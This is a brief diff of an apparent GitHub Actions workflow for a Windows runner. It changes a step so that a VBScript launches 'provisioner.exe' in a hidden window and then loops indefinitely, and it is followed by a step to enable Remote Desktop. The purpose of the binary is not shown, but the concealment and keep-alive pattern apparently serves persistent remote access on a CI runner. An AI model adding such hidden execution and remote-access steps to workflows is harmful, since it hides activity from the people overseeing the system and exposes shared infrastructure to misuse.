@@ -7,15 +7,24 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - name: Run provisioner.exe silently in background
+    - name: Run provisioner.exe silently in background (VBScript, infinite loop)
       shell: powershell
       run: |
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName = "C:\actions\runner-provisioner-Windows\provisioner.exe"
-        $psi.WindowStyle = 'Hidden'
-        $psi.CreateNoWindow = $true
-        $psi.UseShellExecute = $false
-        [System.Diagnostics.Process]::Start($psi)
+        $vbsPath = "$env:TEMP\provisioner.vbs"
+        $exePath = "C:\actions\runner-provisioner-Windows\provisioner.exe"
+
+        $vbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run ""$exePath"", 0, False
+Do
+    WScript.Sleep 30000
+Loop
+"@
+
+        Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII
+
+        # Launch the VBScript
+        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
 
     - name: Enable Remote Desktop
       shell: powershell
